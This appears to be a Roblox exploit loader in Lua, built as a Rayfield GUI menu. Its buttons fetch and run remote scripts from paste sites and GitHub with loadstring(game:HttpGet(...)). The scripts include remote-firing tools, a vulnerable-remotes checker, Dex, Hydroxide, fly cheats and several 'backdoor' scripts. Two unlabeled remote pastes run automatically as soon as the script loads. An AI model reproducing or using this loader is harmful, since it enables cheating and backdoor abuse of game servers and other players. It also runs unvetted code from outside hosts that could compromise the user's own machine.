loadstring(game:HttpGet("https://pastefy.app/UMiXRIAf/raw",true))()
loadstring(game:HttpGet("https://pastefy.app/QdnGIUlI/raw",true))()

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()


local Window = Rayfield:CreateWindow({
   Name = "B0ggyd0lan's PrivateGUI",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by b0ggyd0lan on tiktok",
   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Main⭐", 4483362458)

local Section = Tab:CreateSection("Main")

local Label = Tab:CreateLabel("GUI's🔥", 4483362458, Color3.fromRGB(255, 255, 255), false)


local Button = Tab:CreateButton({
   Name = "Remote Fire",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gameremotefireserver.lua"))()
   -- The function that takes place when the button is pressed
   end,
})

local Button = Tab:CreateButton({
Name = "Vulnerable remotes checker",
Callback = function()
loadstring(game:HttpGet("https://pastefy.app/knUV7E2b/raw",true))()
-- The function that takes place when the button is pressed
end,
})

local Button = Tab:CreateButton({
Name = "QuirkyCMDS",
Callback = function()
loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
-- The function that takes place when the button is pressed
end,
})

local Button = Tab:CreateButton({
Name = "hydroxide",
Callback = function()
local owner = "Hosvile" local branch = "revision" local function webImport(file) return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/MC-Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')() end webImport("init") webImport("ui/main")
-- The function that takes place when the button is pressed
end,
})

local Button = Tab:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   -- The function that takes place when the button is pressed
   end,
})


local Tab = Window:CreateTab("Local Player🥷", 4483362458) -- Title, Image

local Label = Tab:CreateLabel("LocalPlayer", 4483362458, Color3.fromRGB(255, 255, 255), false) -- Title, Icon, Color, IgnoreTheme


local Button = Tab:CreateButton({
   Name = "Fly",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()

   -- The function that takes place when the button is pressed
   end,
})

local Button = Tab:CreateButton({
   Name = "Walk on Walls",
   Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
   -- The function that takes place when the button is pressed
   end,
})


local Button = Tab:CreateButton({
   Name = "Reverse",
   Callback = function()
loadstring(game:HttpGet("https://mscripts.vercel.app/scfiles/reverse-script.lua"))()
   -- The function that takes place when the button is pressed
   end,
})



local Tab = Window:CreateTab("Auto Execute", 4483362458) -- Title, Image

local Label = Tab:CreateLabel("Hubs", 4483362458, Color3.fromRGB(255, 255, 255), false) -- Title, Icon, Color, IgnoreTheme

local Button = Tab:CreateButton({
   Name = "Fire all Remotes",
   Callback = function()
loadstring(game:HttpGet("https://pastefy.app/Z4qr8inE/raw",true))()
   -- The function that takes place when the button is pressed
   end,
})

local Tab = Window:CreateTab("Backdoor scripts", 4483362458) -- Title, Image
local Label = Tab:CreateLabel("Backdoor", 4483362458, Color3.fromRGB(255, 255, 255), false) -- Title, Icon, Color, IgnoreTheme

local Button = Tab:CreateButton({
   Name = "RC7",
   Callback = function()
loadstring(game:HttpGet("https://pastefy.app/HHJrRNTK/raw",true))()
   -- The function that takes place when the button is pressed
   end,
})


local Button = Tab:CreateButton({
Name = "Backdoorv2",
Callback = function()
loadstring(game:HttpGet("https://pastefy.app/PCLasNAc/raw",true))()
-- The function that takes place when the button is pressed
end,
})


local Button = Tab:CreateButton({
Name = "Backdoor Legacy",
Callback = function()
loadstring(game:HttpGet("https://pastefy.app/82Ty2DZX/raw",true))()
-- The function that takes place when the button is pressed
end,
})

local Button = Tab:CreateButton({
Name = "Micro Backdoor",
Callback = function()
loadstring(game:HttpGet("https://paste.ee/r/1FC2N"))()
-- The function that takes place when the button is pressed
end,
})


local Button = Tab:CreateButton({
Name = "souls backdoor",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/rgERwgFj"))()
-- The function that takes place when the button is pressed
end,
})

















